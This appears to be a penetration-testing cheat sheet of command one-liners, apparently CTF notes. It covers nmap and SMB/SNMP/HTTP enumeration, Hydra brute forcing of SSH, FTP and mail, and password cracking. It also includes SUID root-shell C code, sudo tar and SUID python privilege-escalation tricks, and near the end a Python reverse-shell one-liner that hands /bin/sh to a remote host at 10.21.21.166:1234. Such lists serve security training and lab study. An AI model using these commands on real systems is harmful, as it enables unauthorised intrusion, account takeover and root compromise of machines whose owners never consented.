# NMAP Commands

Nmap (“Network Mapper”) is a free and open-source utility for network discovery and security auditing. It's a versatile tool used by both systems and network administrators for tasks like network inventory, managing service upgrade schedules, and monitoring host or service uptime. Nmap runs on all major computer operating systems, and official binary packages are available for Linux, Windows, and Mac OS X.
### 1.nmap -v -sS -A -T4 target 	
Nmap verbose scan, runs syn stealth, T4 timing, OS and service version info, traceroute and scripts against services.
ping sweep sudo nmap -pn target 	Does a ping sweep over the target's network to see all the available IPs.
### 2.nmap -v -sS -p–A -T4 target 	
As above but scans all TCP ports (takes a lot longer).
### 3.nmap -v -sU -sS -p- -A -T4 target 	
As above but scans all TCP ports and UDP scan (takes even longer).
nmap -v -p 445 –script=smb-check-vulns --script-args=unsafe=1 192.168.1.X 	Nmap script to scan for vulnerable SMB servers.
nmap localhost 	Displays all the ports that are currently in use.
ls /usr/share/nmap/scripts/* | grep ftp 	Search nmap scripts for keywords.

# SMB Enumeration

In computer networking, Server Message Block (SMB) operates as an application-layer network protocol mainly used for providing shared access to files, printers, and serial ports.
### 1. nbtscan 192.168.1.0/24 	
Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain.
### 2. enum4linux -a target-ip 	
Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing.
### 3. smbclient -L target-ip 	
Lists all SMB shares available on the target machine.
### 4. smbget -R smb://target-ip/share 	
Recursively downloads files from an SMB share.
### 5. rpcclient -U "" target-ip 	
Connects to an SMB server using an empty username and lists available commands.
### 6. showmount -e target-ip 	
Shows the available shares on the target machine, useful for NFS.
### 7. smbmap -H target-ip 	
Shows share permissions of the target.
smbstatus 	Lists current Samba connections. Useful when run on the target machine.

# Other Host Discovery Methods

Other methods of host discovery that don’t use Nmap.
###  netdiscover -r 192.168.1.0/24 	
Discovers IP, MAC Address and MAC vendor on the subnet from ARP.
### arp-scan --interface=eth0 192.168.1.0/24 	
ARP scan to discover hosts on the local network.
### fping -g 192.168.1.0/24 	
Sends ICMP echo requests to multiple hosts to check if they are alive.
### masscan -p1-65535,U:1-65535 192.168.1.0/24 --rate=1000 	
Scans all ports at a high rate, useful for initial discovery.

# Python Local Web Server

Python local web server command, handy for serving up shells and exploits on an attacking machine.
### python -m SimpleHTTPServer 80 	
Run a basic HTTP server, great for serving up shells etc.
### python3 -m http.server 80 	
Run a basic HTTP server using Python 3.
### python -m SimpleHTTPServer 80 --bind 192.168.1.2 	
Bind the server to a specific IP address.

#  Basic FingerPrinting

A device fingerprint or machine fingerprint or browser fingerprint is information collected about a remote computing device for the purpose of identification.
###  nc -v 192.168.1.1 25 	
Basic versioning / fingerprinting via displayed banner.
### telnet 192.168.1.1 25 	
Another method for basic versioning / fingerprinting.
### curl -I http://192.168.1.1 	
Fetch HTTP headers for fingerprinting the web server.
### nmap -O 192.168.1.1 	
Perform OS detection using Nmap.
### whatweb 192.168.1.1 	
Identify web technologies in use on the target.
#  SNMP Enumeration

SNMP enumeration is the process of using SNMP to enumerate user accounts on a target system.
### snmpcheck -t 192.168.1.X -c 
public 	SNMP enumeration
### snmpwalk -c public -v1 192.168.1.X 1 	
SNMP enumeration
### snmpenum -t 192.168.1.X 	
SNMP enumeration
### onesixtyone -c names -i hosts 	
SNMP enumeration
### snmpbulkwalk -v2c -c public -Cn0 -Cr10 192.168.1.X 	
Bulk SNMP enumeration
#  DNS Zone Transfers
nslookup -> set type=any -> ls -d blah.com 	Windows DNS zone transfer
dig axfr blah.com @ns1.blah.com 	Linux DNS zone transfer
host -l blah.com ns1.blah.com 	Another Linux DNS zone transfer method

# HTTP / HTTPS Webserver Enumeration
### nikto -h 192.168.1.1 	
Perform a nikto scan against target
dirbuster 	Configure via GUI, CLI input doesn’t work most of the time
### gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 	
Directory brute forcing with gobuster
### wpscan --url http://192.168.1.1 	
WordPress vulnerability scanner
### joomscan -u http://192.168.1.1 	
Joomla vulnerability scanner
### uniscan -u http://192.168.1.1 -qweds 	
Uniscan automated vulnerability scanner
### curl -I http://192.168.1.1 	
Fetch HTTP headers using curl
### nmap -p80 --script http-enum 192.168.1.1 	
Nmap script for HTTP enumeration
### whatweb http://192.168.1.1 	
Identify technologies used on the website
### wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.1/FUZZ 	
Fuzzing HTTP with wfuzz

# Username Enumeration
SMB User Enumeration
### python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX 	Enumerate users from SMB
### ridenum.py 192.168.XXX.XXX 500 50000 dict.txt 	RID cycle SMB / enumerate users from SMB
### enum4linux -U 192.168.XXX.XXX 	Enumerate SMB usernames using enum4linux
# SNMP User Enumeration
`snmpwalk public -v1 192.168.X.XXX 1 	grep 77.1.2.25
###  python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 192.168.X.XXX 	
Enumerate users from SNMP
### nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt 	
Search for SNMP servers with nmap, grepable output
# Passwords
Wordlists
/usr/share/wordlists 	Kali word lists
wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 	Download a popular wordlist from GitHub
# Brute Forcing Services
Hydra
FTP Brute Force
### hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V 	
Hydra FTP brute force
POP3 Brute Force
### hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V 	
Hydra POP3 brute force
SMTP Brute Force
### hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V 	
Hydra SMTP brute force
SSH Brute Force
### hydra -l root -P /usr/share/wordlistsnmap.lst 192.168.X.XXX ssh 	
Hydra SSH brute force

    Use -t to limit concurrent connections, example: -t 15

# Password Cracking
John The Ripper – JTR
### john –wordlist=/usr/share/wordlists/rockyou.txt hashes 	JTR password cracking
### john –format=descrypt –wordlist /usr/share/wordlists/rockyou.txt hash.txt 	JTR forced descrypt cracking with wordlist
### john –format=descrypt hash –show 	JTR forced descrypt brute force cracking
## Hashcat
### hashcat -m 0 -a 0 hash.txt wordlist.txt 	Hashcat MD5 cracking
### hashcat -m 1000 -a 0 hash.txt wordlist.txt 	Hashcat NTLM cracking

# SUID Binary
### SUID C Shell for /bin/bash

int main(void){
       setresuid(0, 0, 0);
       system("/bin/bash");
}

### SUID C Shell for /bin/sh

int main(void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}

### Building the SUID Shell binary
gcc -o suid suid.c 	Compile the SUID shell
gcc -m32 -o suid suid.c 	Compile the 32-bit SUID shell
TTY Shells
# Python TTY Shell Trick

### python -c 'import pty;pty.spawn("/bin/bash")'

### python3 -c 'import pty;pty.spawn("/bin/bash")'
Spawn Interactive sh shell

### /bin/sh -i
Spawn Perl TTY Shell

### perl -e 'exec "/bin/sh";'
Spawn Ruby TTY Shell

### ruby -e 'exec "/bin/sh"'
Spawn Lua TTY Shell

### lua -e 'os.execute("/bin/sh")'
Spawn TTY Shell from Vi

### :!bash
Spawn TTY Shell from NMAP

### !sh
Spawn TTY Shell from awk

### awk 'BEGIN {system("/bin/sh")}'
Spawn TTY Shell from socat

### socat file:tty,raw,echo=0 tcp-listen:4444


# Networking
TTL Fingerprinting
Operating System 	TTL Size
Windows 	128
Linux 	64
Solaris 	255
Cisco / Network 	255

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.21.166",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Энэ бол “реверс” (голдуу) шелл — зорилтот машины Python скрипт нь өөрийн командын интерфэйс (/bin/sh) -ийг сүлжээгээр дамжуулан алсад байгаа хариуцагч (attacker) машин руу холбож, удаа дараа стандарт оролт/гаралтыг сүлжээнд дамжуулна. Үүнийг ашиглан холбогдсон талтай алсаас команд гүйцэтгэх боломжтой болдог — ихэнхдээ хорлон байгуулахад ашиглагддаг.


# //directory


gobuster dir -u http://10.201.121.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --no-error


# Spawning a TTY Shell

    The first thing to do is use python3 -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.


    hydra -l lin -p locks.txt ssh://10.10.123.58


# tar sudo
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# pythonsuid
sudo install -m =xs $(which python) .

./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'